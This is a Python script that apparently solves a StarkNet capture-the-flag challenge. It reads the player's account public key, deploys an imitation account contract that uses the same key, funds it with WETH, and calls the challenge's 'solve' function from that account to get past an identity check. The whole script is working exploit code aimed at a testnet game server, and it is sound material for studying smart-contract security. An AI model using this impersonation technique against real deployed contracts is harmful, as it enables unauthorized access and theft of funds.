from starknet_py.net import AccountClient
from starknet_py.net import KeyPair
from starknet_py.net.models import StarknetChainId
from starknet_py.contract import Contract
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.networks import TESTNET
from starknet_py.transactions.deploy import make_deploy_tx
import asyncio

# Don't forget to fill values given by gameserver
UUID = None # UUID
RPC_ENDPOINT = f"http://{UUID}@x.x.x.x:yyyy"
GATEWAY_CLIENT = GatewayClient(RPC_ENDPOINT, TESTNET)
PRIV_KEY = None # Private key as integer litteral
USER_ADDRESS = None # User address as hex string
CONTRACT_ADDRESS = None # Contract address as hex string
WETH = 2774287484619332564597403632816768868845110259953541691709975889937073775752 # devnet WETH at 0x62230ea046a9a5fbc261ac77d03c8d41e5d442db2284587570ab46455fd2488
def get_account(address):
    key_pair = KeyPair.from_private_key(PRIV_KEY)
    print(key_pair)
    # Create an AccountClient instance
    account = AccountClient(
        address=address,
        client=GATEWAY_CLIENT,
        key_pair=key_pair,
        chain=StarknetChainId.TESTNET,
        supported_tx_version=1,
    )
    return account
 
async def run():

    acc_client = get_account(USER_ADDRESS)

    # Get the gas balance of the account

    wethContract = await Contract.from_address(client=acc_client, address=WETH)
    (balance, )= await wethContract.functions["balanceOf"].call(int(USER_ADDRESS, 16))

    # Get the public key of the original account (using the old naming convention \o/)

    clientContract = await Contract.from_address(client=acc_client, address=USER_ADDRESS)
    (publicKey, ) = await clientContract.functions["getPublicKey"].call()

    # Create the new account

    FAKE_ACCOUNT_CONTRACT = open("Account.json", "r").read()

    deploy_tx = make_deploy_tx(constructor_calldata = [publicKey], compiled_contract=FAKE_ACCOUNT_CONTRACT)
    result = await GATEWAY_CLIENT.deploy(deploy_tx)
    await GATEWAY_CLIENT.wait_for_tx(tx_hash = result.transaction_hash)

    # Send some gas    

    send_gas_tx = await wethContract.functions["transfer"].invoke(result.contract_address, {'low':int(balance / 2), 'high':0}, max_fee=int(1e16))
    await GATEWAY_CLIENT.wait_for_tx(send_gas_tx.hash)

    # Now we use the newly deployed account and solve

    acc_client = get_account(result.contract_address)

    contract = await Contract.from_address(client=acc_client, address=CONTRACT_ADDRESS)

    invocation = await contract.functions["solved"].call()
    print(invocation)

    invocation = await contract.functions["solve"].invoke(max_fee=int(1e16))
    print(invocation)
    await GATEWAY_CLIENT.wait_for_tx(invocation.hash)

    invocation = await contract.functions["solved"].call()
    print(invocation)
 
if __name__ == "__main__":
    asyncio.run(run())
